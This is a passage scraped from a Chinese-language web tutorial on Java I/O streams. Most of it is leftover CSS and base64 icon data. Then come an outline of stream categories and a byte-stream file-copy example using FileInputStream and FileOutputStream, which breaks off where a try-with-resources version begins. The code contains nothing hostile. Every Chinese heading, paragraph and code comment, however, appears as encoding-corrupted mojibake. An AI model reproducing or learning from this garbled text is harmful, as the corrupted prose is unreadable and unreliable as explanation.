UkaTdjxHfTPnPwav0iEGYADVa9XIRIEyxrAA0jIQxgFL22gYwF7A8/DAzNVdksJvJaTEUZ2kYnZWziN5s1ADPHneEIXByotYuMSrf9JEbbsuv7VcvbaKML8plXtQR0EdIYDqWEmtOgAomZFH8EjWSnek2ulmtljljttHbmaIHCCCHzd9MjwfsmscBeZH9Jyd10nMvz92UQrtCBKvMF06mQy0SiEdRMEGg8mN0YjAlgoDDkPrMI5qJKSkKKydpbB2CZjJkhIBvOBw2CGQgii85bpx//dMqFRKam5uvH7w+K97oe+Cl0HO68uIBH0qyEzpOMwIbZIcFq0I+9cwoElizCjk2KFI1y7Nnx614W1db58fOXIlMzs7Xn/jeDmvBV2Q0mXjGf554O/m4LZHp2N8r61WPMvLZWLdiC4GMAk5BjeeB5lhv39l6+BIbu3m760hXMDKBD08XBKzR8fr04nygnIypOOAJUx/fHrsi0Mnys+vVK+V4VUohaiyPCo2Q9DFALvF/ikw8WS4QvVZALS5ksw47/7R8ejgTPk1UFqU6/3zp8bOM7B/kdu/fkguPGU5JibW+F0sTjWOUw8DklRrg4BiLGeBqbaRLxjlT4no0InFV402RcftJz41cH/f/JnHP3kZaaF6VX/liwist9vYG5+NU9Cg3MNkt/+lU5wS8fTxq3mc7ILjDlAE4CJpe89BOWPiIjBhi9O6PI4G1jsc6RGB3lZwmS76k8H0zOKTkFboG8jS2krFKCX2fvTeaPHIBwAkMHHgncURnL3nuCSnxSopdIzN5th0BIonJ0Lf9yUA9iMkzdRWl3BixOusfDcwQVcS4UKIFwYfGPnM8wY/DyP9NFMXaTE5BU39tGkDgGZz+fJJG0oYcSaOafLcqdECY4LzfSObSzyUOgxqtyisr8SSNOOAkubWoh3TTaeA2YtFEXPnm5x81/j+6MI6JqyS25WSNU6hbCMKHG84marJbdR+vwakRhQLRuQpbzHRLjmpmijI+OmWCtq+LzWtnX5v30gHSsqmWne74DtiACi2+Wz0iXbuLt9D2cDyoPEkWOiyp5XUIwLMi/wJY1FbH5B9ONtdC1KrsD/Q0MCQAS0wccILORDW25amAeOtooAj/KQxfzF17uwTSQ1v3dJ7jnLINwdZYRDa4tPU0sHVXFo/vxFF5BqFqxRfOmgPCk4ft2NgKTCy2Y47JIEg+MIhjYsLy5I25qUYTQlCjMRHsr/UwdYwIK33UO1J5fFNB9XNO6akcywJofVmXQDP2wfrSPcI2xG5BSs3I+IosHr4EtvO1TDAu16xHQq5+ykMblfRXLbhEoFIdDTBdhldvzl+3CMg60ZktI2vNzLW6IIp0waLklot9L63yzuUp8dJd7bglPFe3hIXstBEP58/s6Ocyr4rH2+866ZNbriTzA0RSOWCwakMl1QJgculxPt8Z7O5GLdtW6bvU8R/nO1vb+hMExVAVtEAAAAASUVORK5CYII=");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"â€¢";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEIAAABCCAYAAADjVADoAAAK2GlDQ1BJQ0MgUHJvZmlsZQAASImVlwdUU9kWhs+96Y0WiHRC70gngJTQQxGkg6iEJJBQYkgIKmJnUMGxoCKCZcSKKFhGQMaCWLANAopdJ8igoD4HC6Ki5t3AI8zMW++99fZaJ+dbO/vss/e55671XwAoYWyRKBdWAyBPWCCODQ2gJ6ek0nHPAQRgQAI2wIHNkYiYMTGRALHJ+a/28S4Sjdhte0Wuf///v5oGlyfhAAClIZzBlXDyEG5DxkuOSFwAAOoI4jddUCBScBfCmmKkQIR/V3DWBH9ScMY4o8njMfGxgQjTAcCT2WxxFgBkO8RPL+RkIXnIih4chVyBEOFihH05fDYX4TMI2+XlzVfwIMJWSLwIAApyOoCR8aecWX/Jn6HMz2ZnKXmir3HDBwkkolz2ov/zaP635eVKJ/ewQAaZLw6LVeyHnN/9nPkRShZmzIyeZAF3oiYF86VhCZPMkQSmTjKXHRShXJs7M3KSMwUhLGWeAlb8JPMkwXGTLJ4fq9wrUxzInGS2eHxfIsIyaU6C0s/nsZT5i/jxSZNcKEicOcmSnLiIqZhApV8sjVXWzxOGBkztG6LsPU/yp34FLOXaAn58mLJ39lT9PCFzKqckWVkblxcUPBWToIwXFQQo9xLlxijjebmhSr+kME65tgC5nFNrY5RnmM0Oj5lkIABRgA04dNVJAqCAt7BA0UjgfNEisSCLX0BnIm8bj84Schzs6M6Ozs4AKN7dievwnjb+TkK061O+NYjHr10ul5+e8oUi9/i4KfJYbk35LCsAUNUD4Op+jlRcOOFDK34wyNNTBZpABxgCU2AF7IEzcAfewB8Eg3AQDeJBCpiL1MoHeUAMFoBisAKUgnKwEWwF1WA32AsOgaPgBGgGZ8AFcAXcAF2gFzwCMjAAXoFh8BGMQRCEgygQFdKBjCBzyBZyhhiQLxQMRUKxUAqUDmVBQkgKFUOroHKoAqqG9kB10HHoNHQBugZ1Qw+gPmgIegd9gVEwGdaEDWALeDrMgJlwBBwPz4Gz4Hy4CC6B18NVcC18BG6CL8A34F5YBr+CR1AARULRUMYoexQDFYiKRqWiMlFi1FJUGaoSVYtqQLWiOlC3UTLUa9RnNBZNRdPR9mhvdBg6Ac1B56OXotehq9GH0E3oS+jb6D70MPo7hoLRx9hivDAsTDImC7MAU4qpxBzAnMJcxvRiBjAfsVgsDWuJ9cCGYVOw2djF2HXYndhGbBu2G9uPHcHhcDo4W5wPLhrHxhXgSnHbcUdw53E9uAHcJzwJb4R3xofgU/FC/Ep8Jf4w/hy+B/8CP0ZQI5gTvAjRBC5hEWEDYR+hlXCLMEAYI6oTLYk+xHhiNnEFsYrYQLxMfEx8TyKRTEiepFkkAWk5qYp0jHSV1Ef6TNYg25ADyWlkKXk9+SC5jfyA/J5CoVhQ/CmplALKekod5SLlKeWTClXFQYWlwlVZplKj0qTSo/JGlaBqrspUnatapFqpelL1luprNYKahVqgGlttqVqN2mm1e2oj6lR1J/Vo9Tz1deqH1a+pD2rgNCw0gjW4GiUaezUuavRTUVRTaiCVQ11F3Ue9TB3QxGpaarI0szXLNY9qdmoOa2louWolai3UqtE6qyWjoWgWNBYtl7aBdoJ2l/ZlmsE05jTetLXTGqb1TBvV1tP21+Zpl2k3avdqf9Gh6wTr5Ohs0mnWeaKL1rXRnaW7QHeX7mXd13qaet56HL0yvRN6D/VhfRv9WP3F+nv1b+qPGBgahBqIDLYbXDR4bUgz9DfMNtxieM5wyIhq5GskMNpidN7oJV2LzqTn0qvol+jDxvrGYcZS4z3GncZjJpYmCSYrTRpNnpgSTRmmmaZbTNtNh82MzKLMis3qzR6aE8wZ5nzzbeYd5qMWlhZJFqstmi0GLbUtWZZFlvWWj60oVn5W+Va1VnessdYM6xzrndZdNrCNmw3fpsbmli1s624rsN1p222HsfO0E9rV2t2zJ9sz7Qvt6+37HGgOkQ4rHZod3kw3m546fdP0junfHd0ccx33OT5y0nAKd1rp1Or0ztnGmeNc43zHheIS4rLMpcXlrautK891l+t9N6pblNtqt3a3b+4e7mL3BvchDzOPdI8dHvcYmowYxjrGVU+MZ4DnMs8znp+93L0KvE54/eFt753jfdh7cIblDN6MfTP6fUx82D57fGS+dN903598ZX7Gfmy/Wr9n/qb+XP8D/i+Y1sxs5hHmmwDHAHHAqYDRQK/AJYFtQaig0KCyoM5gjeCE4OrgpyEmIVkh9SHDoW6hi0PbwjBhEWGbwu6xDFgcVh1rONwjfEn4pQhyRFxEdcSzSJtIcWRrFBwVHrU56vFM85nCmc3RIJoVvTn6SYxlTH7ML7Ows2Jm1cx6HusUWxzbEUeNmxd3OO5jfED8hvhHCVYJ0oT2RNXEtMS6xNGkoKSKJFny9OQlyTdSdFMEKS2puNTE1AOpI7ODZ2+dPZDmllaadneO5ZyFc67N1Z2bO/fsPNV57Hkn0zHpSemH07+yo9m17JEMVsaOjGFOIGcb5xXXn7uFO8Tz4VXwXmT6ZFZkDmb5ZG3OGuL78Sv5rwWBgmrB2+yw7N3ZoznROQdz5LlJuY15+Lz0vNNCDWGO8NJ8w/kL53eLbEWlIlm+V/7W/GFxhPiABJLMkbQUaCIi6abUSvqDtK/Qt7Cm8NOCxAUnF6ovFC68uchm0dpFL4pCivYvRi/mLG4vNi5eUdy3hLlkz1JoacbS9mWmy0qWDSwPXX5oBXFFzopfVzqurFj5YVXSqtYSg5LlJf0/hP5QX6pSKi69t9p79e416DWCNZ1rXdZuX/u9jFt2vdyxvLL86zrOuus/Ov1Y9aN8feb6zg3uG3ZtxG4Ubry7yW/ToQr1iqKK/s1Rm5u20LeUbfmwdd7Wa5Wulbu3EbdJt8mqIqtatptt37j9azW/urcmoKZxh/6OtTtGd3J39uzy39Ww22B3+e4vPwl+ur8ndE9TrUVt5V7s3sK9z/cl7uvYz9hfd0D3QPmBbweFB2WHYg9dqvOoqzusf3hDPVwvrR86knak62jQ0ZYG+4Y9jbTG8mPgmPTYy+Ppx++eiDjRfpJxsuFn8593nKKeKmuCmhY1DTfzm2UtKS3dp8NPt7d6t576xeGXg2eMz9Sc1Tq74RzxXMk5+fmi8yNtorbXF7Iu9LfPa390MfninUuzLnVejrh89UrIlYsdzI7zV32unrnmde30dcb15hvuN5puut089avbr6c63Tubbnncauny7GrtntF9rsev58LtoNtX7rDu3Oid2dt9N+Hu/Xtp92T3ufcHH+Q+ePuw8OHYo+WPMY/Lnqg9qXyq/7T2N+vfGmXusrN9QX03n8U9e9TP6X/1u+T3rwMlzynPK18YvagbdB48MxQy1PVy9suBV6JXY69L/6H+jx1vrN78/If/HzeHk4cH3orfyt+te6/z/uAH1w/tIzEjTz/mfRwbLfuk8+nQZ8bnji9JX16MLfiK+1r1zfpb6/eI74/leXK5iC1mj0sBFDLgzEwA3h1EtHEKAFRElxNnT2jrcYMmvgfGCfwnntDf4+YOQAMyKWQR0x+Akwo5i8wqyKyQRPH+AHZxUY5/mSTTxXkiFxlRlphPcvl7AwBwrQB8E8vlYzvl8m/7kGIfANCWP6HpFYZFtHyD3vJRg6LbPe3g7zah9//U499noKjAFfx9/ieoZhkWVvYkwwAAAGxlWElmTU0AKgAAAAgABAEaAAUAAAABAAAAPgEbAAUAAAABAAAARgEoAAMAAAABAAIAAIdpAAQAAAABAAAATgAAAAAAAACQAAAAAQAAAJAAAAABAAKgAgAEAAAAAQAAAEKgAwAEAAAAAQAAAEIAAAAAgodoEQAAAAlwSFlzAAAWJQAAFiUBSVIk8AAAAhRJREFUeAHtnLEuBFEUhs9cu7JCskEhIrZAgYZGoREPwBuIygOoPITKA6jEG/AAolFoaFCgICIKZBNiY8Pyz5rNOWe9wNz5T7N3Z2eT/b/7zZlpziat3xKWBDJoEyh5EDd3DTk5r8vV7Yc8vzbl6zvfwvSERIYHyzI90SeLc1WZrFV85PR9oi+N/YMnOT6t/3tiLAeXFqqytjrSFacDYmfvQS6u37tOiPHA7FS/bK6PmWhpj4AJRYGA9MiKzLpK6An+cqiNVmRleUhArrec6PNzt/5sttLgh0cvcvfY6Px+ZNY9I6Ax6gKErY1xmZ8ZyD0E5MJGIgsyIZsunT3g7qALJuTdAp0nWyMTsunS2QNukbpwOcRaPpvOHvxzQow2ZBvrs+nsfLL8o0QQBJFdMO1XGkEjaIQlQCMsD/YIGkEjLAEaYXmwR9AIGmEJ0AjLgz2CRtAIS4BGWB7sETSCRlgCNMLyYI+gETTCEqARlgd7BI2gEZYAjbA82CNoBI2wBGiE5cEeQSNohCVAIywP9ggaQSMsARphebBH0AgaYQnQCMsjYC5SF2agYi2fTWcPGA7VFfO0n8+mswdMyOrCNJwnpz/P6xqZkE2Xzh4w8qcLI4Hbu/dydvkWBRAAQBZk0uOOyKyzp5PARRiF1puNtR+NTh+oMCvtJ+D8F2N6j6x+PrwzG46gRTDDm5BtsAGBg0X924Qfj7i23p7HNgQAAAAASUVORK5CYII=");background-size:100%;position:relative;right:2px;top:-5px}.markdown-body input[type=checkbox]:checked:before{background:url("data:image/png;base64,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");background-size:100%}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-light">.hljs-comment,.hljs-quote{color:#696969}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#d91e18}.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#aa5d00}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:green}.hljs-section,.hljs-title{color:#007faa}.hljs-keyword,.hljs-selector-tag{color:#7928a1}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fefefe;color:#545454}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">å¼•è¨€ï¼šæ•°æ®æµåŠ¨çš„è‰ºæœ¯</h2>
<p>åœ¨Javaä¸­ï¼Œè¾“å…¥è¾“å‡ºï¼ˆI/Oï¼‰æ“ä½œæ˜¯ç¨‹åºä¸å¤–éƒ¨ä¸–ç•Œæ²Ÿé€šçš„æ¡¥æ¢ã€‚æ— è®ºæ˜¯è¯»å–é…ç½®æ–‡ä»¶ã€å†™å…¥æ—¥å¿—ï¼Œè¿˜æ˜¯å¤„ç†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ï¼ŒI/Oæ“ä½œæ— å¤„ä¸åœ¨ã€‚ç†è§£Javaçš„I/Oä½“ç³»ï¼Œä¸ä»…èƒ½å†™å‡ºæ›´é«˜æ•ˆçš„ä»£ç ï¼Œè¿˜èƒ½é¿å…è®¸å¤šå¸¸è§çš„é™·é˜±ã€‚</p>
<h2 data-id="heading-1">Java I/O ä½“ç³»ç»“æ„æ¦‚è§ˆ</h2>
<h3 data-id="heading-2">I/Oæµçš„åˆ†ç±»</h3>
<p>Java I/Oæµä¸»è¦åˆ†ä¸ºä¸¤å¤§ç±»ï¼š</p>
<pre><code class="hljs language-Java" lang="Java">Java I/O æµ
â”œâ”€â”€ æŒ‰æ•°æ®æ–¹å‘åˆ†
â”‚   â”œâ”€â”€ è¾“å…¥æµ (InputStream/Reader)
â”‚   â””â”€â”€ è¾“å‡ºæµ (OutputStream/Writer)
â”‚
â”œâ”€â”€ æŒ‰æ•°æ®ç±»å‹åˆ†
â”‚   â”œâ”€â”€ å­—èŠ‚æµ (å¤„ç†äºŒè¿›åˆ¶æ•°æ®)
â”‚   â”‚   â”œâ”€â”€ InputStream
â”‚   â”‚   â””â”€â”€ OutputStream
â”‚   â”‚
â”‚   â””â”€â”€ å­—ç¬¦æµ (å¤„ç†æ–‡æœ¬æ•°æ®)
â”‚       â”œâ”€â”€ Reader
â”‚       â””â”€â”€ Writer
â”‚
â””â”€â”€ æŒ‰åŠŸèƒ½åˆ†
    â”œâ”€â”€ èŠ‚ç‚¹æµ (ç›´æ¥è¿æ¥æ•°æ®æº)
    â””â”€â”€ å¤„ç†æµ/åŒ…è£…æµ (è£…é¥°å™¨æ¨¡å¼ï¼Œå¢å¼ºåŠŸèƒ½)
</code></pre>
<h2 data-id="heading-3">å­—èŠ‚æµæ“ä½œï¼šå¤„ç†äºŒè¿›åˆ¶æ•°æ®</h2>
<h3 data-id="heading-4">FileInputStream å’Œ FileOutputStream</h3>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ByteStreamExample</span> {
    
    <span class="hljs-comment">// å¤åˆ¶æ–‡ä»¶çš„åŸºæœ¬æ–¹æ³•ï¼ˆå­—èŠ‚æµï¼‰</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">copyFile</span><span class="hljs-params">(String sourcePath, String targetPath)</span> <span class="hljs-keyword">throws</span> IOException {
        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;
        
        <span class="hljs-keyword">try</span> {
            fis = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(sourcePath);
            fos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(targetPath);
            
            <span class="hljs-type">byte</span>[] buffer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">8192</span>]; <span class="hljs-comment">// 8KBç¼“å†²åŒº</span>
            <span class="hljs-type">int</span> bytesRead;
            
            <span class="hljs-keyword">while</span> ((bytesRead = fis.read(buffer)) != -<span class="hljs-number">1</span>) {
                fos.write(buffer, <span class="hljs-number">0</span>, bytesRead);
            }
            
            System.out.println(<span class="hljs-string">"æ–‡ä»¶å¤åˆ¶å®Œæˆ"</span>);
            
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-comment">// ç¡®ä¿èµ„æºè¢«å…³é—­</span>
            <span class="hljs-keyword">if</span> (fis != <span class="hljs-literal">null</span>) {
                fis.close();
            }
            <span class="hljs-keyword">if</span> (fos != <span class="hljs-literal">null</span>) {
                fos.close();
            }
        }
    }
    
    <span class="hljs-comment">// ä½¿ç”¨try-with-resourcesæ”¹è¿›ç‰ˆæœ¬</span>
